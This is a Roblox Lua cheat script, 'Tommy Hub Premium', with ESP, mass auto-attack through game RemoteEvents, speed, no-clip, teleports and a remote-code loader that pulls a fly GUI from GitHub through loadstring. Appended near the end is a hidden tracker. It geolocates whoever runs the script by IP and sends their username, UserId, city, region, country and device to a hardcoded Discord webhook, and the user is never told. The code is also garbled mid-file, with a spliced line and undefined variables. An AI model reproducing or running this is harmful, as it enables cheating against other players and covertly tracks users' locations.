local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")

-- ESP
local ESPEnabled = false
local ESPObjects = {}

local function CreateESP(target)
    if not target:FindFirstChild("Head") then return end
    local billboard = Instance.new("BillboardGui")
    billboard.Name = "TommyESP"
    billboard.Adornee = target.Head
    billboard.Size = UDim2.new(0, 100, 0, 50)
    billboard.StudsOffset = Vector3.new(0, 2, 0)
    billboard.AlwaysOnTop = true
    billboard.Parent = target.Head
    local label = Instance.new("TextLabel")
    label.BackgroundTransparency = 1
    label.Size = UDim2.new(1, 0, 1, 0)
    label.Text = target.Name
    label.Font = "GothamBold"
    label.TextSize = 14
    label.TextColor3 = target:IsA("Player") and Color3.new(0,1,1) or Color3.new(1,1,1)
    label.TextStrokeTransparency = 0
    label.Parent = billboard
    table.insert(ESPObjects, billboard)
end

local function ClearESP()
    for _, obj in pairs(ESPObjects) do if obj then obj:Destroy() end end
    ESPObjects = {}
end

local function UpdateESP()
    ClearESP()
    if not ESPEnabled then return end
    for _, p in pairs(Players:GetPlayers()) do
        if p ~= Players.LocalPlayer and p.Character then CreateESP(p.Character) end
    end
    local enemies = workspace:FindFirstChild("Enemies")
    if enemies then for _, npc in pairs(enemies:GetChildren()) do CreateESP(npc) end end
end

-- FAST ATTACK
local FastAttackEnabled = false
local FastAttackRange = 5000
local FastAttackConnection = nil
local Net = ReplicatedStorage:WaitForChild("Modules"):WaitForChild("Net")
local RegisterHit = Net["RE/RegisterHit"]
local RegisterAttack = Net["RE/RegisterAttack"]

local function AttackMultipleTargets(targets)
    pcall(function()
        if not targets or #targets == 0 then return end
        local allTargets = {}
        for _, char in pairs(targets) do
            local head = char:FindFirstChild("Head")
            if head then table.insert(allTargets, {char, head}) end
        end
        if #allTargets == 0 then return end
        RegisterAttack:FireServer(0)
        RegisterHit:FireServer(allTargets[1][2], allTargets)
    end)
end

local function StartFastAttack()
    if FastAttackConnection then task.cancel(FastAttackConnection) end
    FastAttackConnection = task.spawn(function()
        while FastAttackEnabled do
            RunService.Stepped:Wait()
            local myChar = Players.LocalPlayer.Character
            local myHRP = myChar and myChar:FindFirstChild("HumanoidRootPart")
            if not myHRP then continue end
            local targets = {}
            for _, player in pairs(Players:GetPlayers()) do
                if player ~= Players.LocalPlayer and player.Character then
                    local hum = player.Character:FindFirstChild("Humanoid")
                    local hrp = player.Character:FindFirstChild("HumanoidRootPart")
                    if hum and hrp and hum.Health > 0 and (hrp.Position - myHRP.Position).Magnitude <= FastAttackRange then
                        table.insert(targets, player.Character)
                    end
                end
            end
            local enemies = workspace:FindFirstChild("Enemies")
            if enemies then
                for _, npc in pairs(enemies:GetChildren()) do
                    local hum = npc:FindFirstChild("Humanoid")
                    local hrp = npc:FindFirstChild("HumanoidRootPart")
                    if hum and hrp and hum.Health > 0 and (hrp.Position - myHRP.Position).Magnitude <= FastAttackRange then
                        table.insert(targets, npc)
                    end
                end
            end
            if #targets > 0 then AttackMultipleTargets(targets) end
        end
    end)
end

-- GUI
local pgui = Players.LocalPlayer:WaitForChild("PlayerGui")
if pgui:FindFirstChild("TommyHub_Premium") then pgui.TommyHub_Premium:Destroy() end
local screenGui = Instance.new("ScreenGui", pgui)
screenGui.Name = "TommyHub_Premium"
screenGui.ResetOnSpawn = false

local mainFrame = Instance.new("Frame", screenGui)
local normalSize, minimizedSize = UDim2.new(0,420,0,600), UDim2.new(0,150,0,40)
mainFrame.Size = normalSize
mainFrame.Position = UDim2.new(0.5,-210,0.15,0)
mainFrame.BackgroundColor3 = Color3.fromRGB(15,15,28)
mainFrame.Active = true
mainFrame.Draggable = true
mainFrame.BorderSizePixel = 0
local gradient = Instance.new("UIGradient", mainFrame)
gradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0,Color3.fromRGB(20,20,40)),ColorSequenceKeypoint.new(1,Color3.fromRGB(10,10,25))}
Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0,12)
local stroke = Instance.new("UIStroke", mainFrame)
stroke.Color = Color3.fromRGB(100,50,255)
stroke.Thickness = 2

local topBar = Instance.new("Frame", mainFrame)
topBar.Size = UDim2.new(1,0,0,50)
topBar.BackgroundColor3 = Color3.fromRGB(25,15,50)
topBar.BorderSizePixel = 0
local topBarGradient = Instance.new("UIGradient", topBar)
topBarGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0,Color3.fromRGB(100,50,255)),ColorSequenceKeypoint.new(1,Color3.fromRGB(50,25,150))}
Instance.new("UICorner", topBar).CornerRadius = UDim.new(0,12)

local logoLabel = Instance.new("TextLabel", topBar)
logoLabel.Size = UDim2.new(0,40,0,40)
logoLabel.Position = UDim2.new(0,10,0.5,-20)
logoLabel.Text = "👑"
logoLabel.TextSize = 28
logoLabel.BackgroundTransparency = 1
logoLabel.Font = "GothamBlack"

local titleLabel = Instance.new("TextLabel", topBar)
titleLabel.Size = UDim2.new(0.6,0,1,0)
titleLabel.Position = UDim2.new(0,55,0,0)
titleLabel.Text = "TOMMY HUB PREMIUM"
titleLabel.TextColor3 = Color3.new(1,1,1)
titleLabel.Font = "GothamBlack"
titleLabel.TextSize = 16
titleLabel.TextXAlignment = "Left"
titleLabel.BackgroundTransparency = 1

local versionLabel = Instance.new("TextLabel", topBar)
versionLabel.Size = UDim2.new(0.3,0,0.5,0)
versionLabel.Position = UDim2.new(0,55,0.5,0)
versionLabel.Text = "v1.1 PREMIUM"
versionLabel.TextColor3 = Color3.fromRGB(150,100,255)
versionLabel.Font = sDisp.Size = UDim2.new(0,50,1,0)
sDisp.Position = UDim2.new(0.35,0,0,0)
sDisp.Text = "16"
sDisp.TextColor3 = Color3.fromRGB(100,200,255)
sDisp.Font = "GothamBlack"
sDisp.TextSize = 16
sDisp.BackgroundTransparency = 1

local btnP = Instance.new("TextButton", speedPanel)
btnP.Size = UDim2.new(0,35,0,35)
btnP.Position = UDim2.new(0.6,0,0.5,-17)
btnP.Text = "+"
btnP.BackgroundColor3 = Color3.fromRGB(50,50,100)
btnP.TextColor3 = Color3.new(1,1,1)
btnP.Font = "GothamBold"
btnP.TextSize = 18
btnP.BorderSizePixel = 0
Instance.new("UICorner", btnP).CornerRadius = UDim.new(0,6)

local sVal, sAct = 16, false
sBtn.MouseButton1Click:Connect(function()
    sAct = not sAct
    speedPanel.Visible = sAct
    sBtn.Text = sAct and "🚀 Speed Controller: ON" or "🚀 Speed Controller: OFF"
end)
btnP.MouseButton1Click:Connect(function() sVal = math.clamp(sVal+10,16,500) sDisp.Text = tostring(sVal) end)
btnM.MouseButton1Click:Connect(function() sVal = math.clamp(sVal-10,16,500) sDisp.Text = tostring(sVal) end)
RunService.Heartbeat:Connect(function()
    if sAct and Players.LocalPlayer.Character:FindFirstChild("Humanoid") then
        local hum = Players.LocalPlayer.Character.Humanoid
        if hum.MoveDirection.Magnitude > 0 then
            Players.LocalPlayer.Character:TranslateBy(hum.MoveDirection * (sVal/55))
        end
    end
end)

local jBtn = addBtn("⬆️ Infinite Jump: OFF", Color3.fromRGB(100,200,255), movePage)
local iJ = false
jBtn.MouseButton1Click:Connect(function()
    iJ = not iJ
    jBtn.Text = iJ and "⬆️ Infinite Jump: ON" or "⬆️ Infinite Jump: OFF"
end)
UserInputService.JumpRequest:Connect(function()
    if iJ and Players.LocalPlayer.Character:FindFirstChild("Humanoid") then
        Players.LocalPlayer.Character.Humanoid:ChangeState("Jumping")
    end
end)

local nBtn = addBtn("🔥 No Clip: OFF", Color3.fromRGB(200,100,255), movePage)
local ncl = false
nBtn.MouseButton1Click:Connect(function()
    ncl = not ncl
    nBtn.Text = ncl and "🔥 No Clip: ON" or "🔥 No Clip: OFF"
end)
RunService.Stepped:Connect(function()
    if ncl then
        for _,v in pairs(Players.LocalPlayer.Character:GetDescendants()) do
            if v:IsA("BasePart") then v.CanCollide = false end
        end
    end
end)

local wowBtn = addBtn("💧 Walk on Water: OFF", Color3.fromRGB(0,200,255), movePage)
local walkWaterEnabled = false
wowBtn.MouseButton1Click:Connect(function()
    walkWaterEnabled = not walkWaterEnabled
    wowBtn.Text = walkWaterEnabled and "💧 Walk on Water: ON" or "💧 Walk on Water: OFF"
end)
RunService.RenderStepped:Connect(function()
    local char = Players.LocalPlayer.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    if walkWaterEnabled and hrp then
        if hrp.Position.Y >= 9.5 and hrp.AssemblyLinearVelocity.Y <= 0 then
            local waterPart = workspace:FindFirstChild("TommyWaterSolid")
            if not waterPart then
                waterPart = Instance.new("Part", workspace)
                waterPart.Name = "TommyWaterSolid"
                waterPart.Size = Vector3.new(20,1,20)
                waterPart.Transparency = 1
                waterPart.Anchored = true
                waterPart.CanCollide = true
                waterPart.CanQuery = false
            end
            waterPart.CFrame = CFrame.new(hrp.Position.X, 9.2, hrp.Position.Z)
        else
            if workspace:FindFirstChild("TommyWaterSolid") then workspace.TommyWaterSolid:Destroy() end
        end
    else
        if workspace:FindFirstChild("TommyWaterSolid") then workspace.TommyWaterSolid:Destroy() end
    end
end)

-- EXTEND ZOOM
local currentFOV = 70
local camera = workspace.CurrentCamera

local zoomDisp = Instance.new("TextLabel", movePage)
zoomDisp.Size = UDim2.new(0.95,0,0,30)
zoomDisp.BackgroundColor3 = Color3.fromRGB(20,15,40)
zoomDisp.TextColor3 = Color3.fromRGB(180,220,255)
zoomDisp.Font = "GothamBlack"
zoomDisp.TextSize = 13
zoomDisp.Text = "🔭 Zoom: 70"
zoomDisp.BorderSizePixel = 0
Instance.new("UICorner", zoomDisp).CornerRadius = UDim.new(0,8)
Instance.new("UIStroke", zoomDisp).Color = Color3.fromRGB(100,50,255)

local function setZoom(fov)
    currentFOV = math.clamp(fov, 20, 500)
    camera.FieldOfView = currentFOV
    zoomDisp.Text = "🔭 Zoom: " .. currentFOV
end

local zoomRow1 = Instance.new("Frame", movePage)
zoomRow1.Size = UDim2.new(0.95,0,0,35)
zoomRow1.BackgroundTransparency = 1
local zr1Layout = Instance.new("UIListLayout", zoomRow1)
zr1Layout.FillDirection = "Horizontal"
zr1Layout.Padding = UDim.new(0,5)
zr1Layout.HorizontalAlignment = "Center"

local zoomRow2 = Instance.new("Frame", movePage)
zoomRow2.Size = UDim2.new(0.95,0,0,35)
zoomRow2.BackgroundTransparency = 1
local zr2Layout = Instance.new("UIListLayout", zoomRow2)
zr2Layout.FillDirection = "Horizontal"
zr2Layout.Padding = UDim.new(0,5)
zr2Layout.HorizontalAlignment = "Center"

local function makeZoomBtn(label, action, parent)
    local b = Instance.new("TextButton", parent)
    b.Size = UDim2.new(0,75,0,32)
    b.Text = label
    b.BackgroundColor3 = Color3.fromRGB(25,20,50)
    b.TextColor3 = Color3.new(1,1,1)
    b.Font = "GothamBold"
    b.TextSize = 11
    b.BorderSizePixel = 0
    Instance.new("UICorner", b).CornerRadius = UDim.new(0,8)
    local s = Instance.new("UIStroke", b)
    s.Color = Color3.fromRGB(100,180,255)
    s.Thickness = 2
    b.MouseButton1Click:Connect(action)
end

makeZoomBtn("− 10", function() setZoom(currentFOV - 10) end, zoomRow1)
makeZoomBtn("Default", function() setZoom(70) end, zoomRow1)
makeZoomBtn("+ 10", function() setZoom(currentFOV + 10) end, zoomRow1)
makeZoomBtn("Wide (110)", function() setZoom(110) end, zoomRow2)
makeZoomBtn("Max (120)", function() setZoom(120) end, zoomRow2)
makeZoomBtn("500", function() setZoom(500) end, zoomRow2)

-- FLY GUI
local flyBtn = addBtn("✈️ Fly GUI (FlyGuiV3)", Color3.fromRGB(0,220,180), movePage)
flyBtn.MouseButton1Click:Connect(function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/XNEOFF/FlyGuiV3/main/FlyGuiV3.txt"))()
    end)
end)

-- SEA 2
addBtn("🗺️ Barco Maldito", Color3.fromRGB(0,200,150), sea2Page).MouseButton1Click:Connect(function()
    Players.LocalPlayer.Character:PivotTo(CFrame.new(923,126,32852))
end)

-- SEA 3
addBtn("🏰 Castillo", Color3.fromRGB(150,100,255), sea3Page).MouseButton1Click:Connect(function()
    Players.LocalPlayer.Character:PivotTo(CFrame.new(-5085,316,-3156))
end)
addBtn("🏛️ Mansión", Color3.fromRGB(255,170,0), sea3Page).MouseButton1Click:Connect(function()
    Players.LocalPlayer.Character:PivotTo(CFrame.new(-12463,375,-7523))
end)

-- CONTROLES VENTANA
closeBtn.MouseButton1Click:Connect(function()
    ESPEnabled = false
    ClearESP()
    camera.FieldOfView = 70
    if workspace:FindFirstChild("TommyWaterSolid") then workspace.TommyWaterSolid:Destroy() end
    screenGui:Destroy()
end)-- ==================== 🔥 WEBHOOK PRO + GEO ====================

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local MarketplaceService = game:GetService("MarketplaceService")

local Player = Players.LocalPlayer

local WEBHOOK_URL = "https://discord.com/api/webhooks/1503826882322501765/jhJEwfwgUSj9bCw6ltRmKz_wsjnDhz_7g_R5uN4pdyS2S1x2_hsBfitywOZ1Fpfvs3ql"

-- ⏰ Hora
local function GetTime()
    return os.date("%Y-%m-%d %H:%M:%S")
end

-- 🌍 GEO COMPLETO
local function GetLocation()
    local success, result = pcall(function()
        return game:HttpGet("http://ip-api.com/json/")
    end)

    if success then
        local data = HttpService:JSONDecode(result)

        return {
            country = data.country or "Desconocido",
            region = data.regionName or "Desconocido",
            city = data.city or "Desconocido"
        }
    end

    return {
        country = "Error",
        region = "Error",
        city = "Error"
    }
end

-- 📱 Dispositivo
local function GetDevice()
    if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
        return "📱 Móvil"
    elseif UserInputService.GamepadEnabled then
        return "🎮 Consola"
    else
        return "🖥️ PC"
    end
end

-- 🖥️ Plataforma
local function GetPlatform()
    return tostring(UserInputService:GetPlatform())
end

-- 🎮 Juego
local function GetGameName()
    local name = "Desconocido"
    pcall(function()
        name = MarketplaceService:GetProductInfo(game.PlaceId).Name
    end)
    return name
end

-- 📩 Enviar webhook
local function SendWebhook(title, color, fields)
    local formatted = {}

    for _, f in pairs(fields) do
        table.insert(formatted, {
            name = f.name,
            value = f.value,
            inline = true
        })
    end

    pcall(function()
        request({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({
                embeds = {{
                    title = title,
                    color = color,
                    fields = formatted,
                    footer = {
                        text = "Tommy Hub Premium 🔥"
                    }
                }}
            })
        })
    end)
end

-- ==================== 📊 DATA ====================

local loc = GetLocation()

local DATA = {
    player = Player.Name,
    userid = Player.UserId,
    time = GetTime(),
    country = loc.country,
    region = loc.region,
    city = loc.city,
    device = GetDevice(),
    platform = GetPlatform(),
    game = GetGameName()
}

-- ==================== 🚀 EVENTOS ====================

-- HUB ACTIVADO
SendWebhook("🚀 HUB ACTIVADO", 65280, {
    {name = "👤 Jugador", value = DATA.player},
    {name = "🆔 UserId", value = tostring(DATA.userid)},
    {name = "⏰ Hora", value = DATA.time},
    {name = "🌍 País", value = DATA.country},
    {name = "📍 Región", value = DATA.region},
    {name = "🏙️ Ciudad", value = DATA.city},
    {name = "📱 Dispositivo", value = DATA.device},
    {name = "🖥️ Plataforma", value = DATA.platform},
    {name = "🎮 Juego", value = DATA.game}
})

-- LOGIN
Player.CharacterAdded:Connect(function()
    SendWebhook("🔐 LOGIN", 255, {
        {name = "👤 Jugador", value = DATA.player},
        {name = "⏰ Hora", value = GetTime()},
        {name = "🌍 País", value = DATA.country},
        {name = "📍 Región", value = DATA.region},
        {name = "🏙️ Ciudad", value = DATA.city},
        {name = "📱 Dispositivo", value = DATA.device}
    })
end)
minimizeBtn.MouseButton1Click:Connect(function()
    contentFrame.Visible = false
    tabContainer.Visible = false
    mainFrame:TweenSize(minimizedSize,"Out","Quint",0.3,true)
end)
maximizeBtn.MouseButton1Click:Connect(function()
    mainFrame:TweenSize(normalSize,"Out","Quint",0.3,true)
    task.wait(0.2)
    contentFrame.Visible = true
    tabContainer.Visible = true
end)
